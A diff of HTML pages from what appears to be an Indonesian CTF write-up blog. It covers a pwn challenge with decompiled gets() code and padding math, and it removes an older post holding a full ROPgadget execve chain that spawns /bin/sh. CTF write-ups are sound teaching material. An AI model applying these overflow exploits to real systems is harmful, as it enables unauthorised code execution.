+	&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;777&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Flag : {}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+		&lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
+	&lt;span class=&quot;n&quot;&gt;url&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;http://13.59.6.98/{}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;re&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;findall&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;url=(.*?)&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+&lt;p&gt;Setelah menunggu beberapa saat Flag akan muncul.&lt;/p&gt;
+
+&lt;p&gt;Flag : &lt;code class=&quot;highlighter-rouge&quot;&gt;RC3W3MUS7G0D33P3RR3D1R3C777&lt;/code&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;pwn-100&quot;&gt;Pwn (100)&lt;/h1&gt;
+
+&lt;p&gt;Diberikan sebuah file elf 32bit stripped bernama &lt;code class=&quot;highlighter-rouge&quot;&gt;easy_peasy&lt;/code&gt;&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;file easy_peasy 
+easy_peasy: ELF 32-bit LSB executable, Intel 80386, version 1 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SYSV&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;, dynamically linked, interpreter /lib/ld-linux.so.2, &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GNU/Linux 2.6.24, BuildID[sha1]&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3a5dd5cc49b1a8efbc0a6269bdea9c1da99b3bcf, stripped
+&lt;span class=&quot;gp&quot;&gt;$ &lt;/span&gt;checksec easy_peasy 
+&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'easy_peasy'&lt;/span&gt;
+    Arch:     i386-32-little
     RELRO:    Partial RELRO
     Stack:    No canary found
     NX:       NX enabled
-    PIE:      No PIE (0x400000)
-&lt;/pre&gt;
-&lt;p&gt;Berikut adalah hasil decompile menggunakan IDA pro&lt;/p&gt;
-&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;&lt;span style=&quot;color:#99cf50;&quot;&gt;int&lt;/span&gt; __cdecl &lt;span style=&quot;color:#89bdff;&quot;&gt;main&lt;/span&gt;(int argc, const char **argv, const char **envp)
+    PIE:      No PIE &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0x8048000&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Hasi decompile menggunakan &lt;code class=&quot;highlighter-rouge&quot;&gt;IDA PRO&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;void __cdecl main()
 {
-  char v4; // [sp+0h] [bp-2710h]@1
-  welcome_msg();
-  gets(&amp;amp;v4);
-  return foo((__int64)&amp;amp;v4);
+  int v0; // [sp+18h] [bp-18h]@1
+  int v1; // [sp+28h] [bp-8h]@1
+  int v2; // [sp+2Ch] [bp-4h]@1
+
+  v2 = 0;
+  v1 = 0;
+  printf(&quot;Enter Key: &quot;);
+  gets((char *)&amp;amp;v0);
+  if ( v2 == 0xCAFEF00D &amp;amp;&amp;amp; v1 == 0xC0FFEE )
+    sub_80484EF();
+  puts(&quot;Error: Invalid key!&quot;);
+  srand(1u);
+  init();
 }
-&lt;/pre&gt;
-&lt;p&gt;Dari hasil decompile IDA pro dipastikan binary tersebut vulnerable terhadap Buffer Overflow karena menggunakan fungsi “gets()” yang tidak memfilter panjang inputan.&lt;/p&gt;
-&lt;p&gt;Dengan asumsi bahwa ASLR pada mesin dalam keadaan ON dan binary tersebut di proteksi dengan NX bit yang tidak memungkinkan untuk eksekusi shellcode, sehingga teknik yang digunakan adalah ROP ( Return Oriented Programming).&lt;/p&gt;
-&lt;p&gt;Sebelumnya, ukuran buffer variable v4 yang menyimpan inputan user adalah 0x2710 (10000) bytes (terlihat pada bp-2710h). Dan dibutuhkan 10000 + 8 bytes untuk mengoverwrite RIP.&lt;/p&gt;
-&lt;p&gt;Karena binary tersebut dicompile dengan flag ( -static ) static binary, pembuatan gadget bisa di automasi menggunakan “ROPgadget” untuk generate ropchain.&lt;/p&gt;
-&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;$ ROPgadget --binary &lt;span style=&quot;color:#dad085;&quot;&gt;echo&lt;/span&gt; --ropchain
-&lt;/pre&gt;
-&lt;p&gt;Berikut exploit code dari ropchain yang digenerate ROPgadget dan disesuikan dengan ukuran buffer untuk overwrite RIP.&lt;/p&gt;
-&lt;pre style=&quot;background:#000;color:#f8f8f8;&quot;&gt;&lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;#!/usr/bin/env python2&lt;/span&gt;
-&lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# execve generated by ROPgadget&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Terlihat penggunaan fungsi &lt;code class=&quot;highlighter-rouge&quot;&gt;gets&lt;/code&gt; yang vulnerable &lt;em&gt;Buffer Overflow&lt;/em&gt;. Dan seperti nya tujuan dari challenge ini adalah melakukan &lt;em&gt;Overwrite Local Variable&lt;/em&gt; v1 dan v2.&lt;/p&gt;
 
-&lt;span style=&quot;color:#e28964;&quot;&gt;from&lt;/span&gt; struct &lt;span style=&quot;color:#e28964;&quot;&gt;import&lt;/span&gt; pack
+&lt;p&gt;Perhitungan Padding.&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-C&quot;&gt;  int v0; // [sp+18h] [bp-18h]@1
+  int v1; // [sp+28h] [bp-8h]@1
+  int v2; // [sp+2Ch] [bp-4h]@1
+&lt;/code&gt;&lt;/pre&gt;
 
-&lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# Padding goes here&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;'A'&lt;/span&gt; &lt;span style=&quot;color:#e28964;&quot;&gt;*&lt;/span&gt; &lt;span style=&quot;color:#3387cc;&quot;&gt;10008&lt;/span&gt;
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# jumlah padding untuk overwrite v1&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x8&lt;/span&gt; 
+&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# jumlah padding untuk overwrite v2&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x18&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x4&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
 
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000401817&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# pop rsi ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x00000000006cb080&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# @ .data&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000479ce6&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# pop rax ; pop rdx ; pop rbx ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; &lt;span style=&quot;color:#65b042;&quot;&gt;'/bin//sh'&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x4141414141414141&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# padding&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x4141414141414141&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# padding&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x00000000004755c1&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# mov qword ptr [rsi], rax ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000401817&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# pop rsi ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x00000000006cb088&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# @ .data + 8&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x000000000042695f&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# xor rax, rax ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x00000000004755c1&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# mov qword ptr [rsi], rax ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x00000000004005d5&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# pop rdi ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x00000000006cb080&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# @ .data&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000401817&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# pop rsi ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x00000000006cb088&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# @ .data + 8&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000442d86&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# pop rdx ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x00000000006cb088&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# @ .data + 8&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x000000000042695f&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# xor rax, rax ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
-p &lt;span style=&quot;color:#e28964;&quot;&gt;+=&lt;/span&gt; pack(&lt;span style=&quot;color:#65b042;&quot;&gt;'&amp;lt;Q'&lt;/span&gt;, &lt;span style=&quot;color:#3387cc;&quot;&gt;0x0000000000467920&lt;/span&gt;) &lt;span style=&quot;color:#aeaeae;font-style:italic;&quot;&gt;# add rax, 1 ; ret&lt;/span&gt;
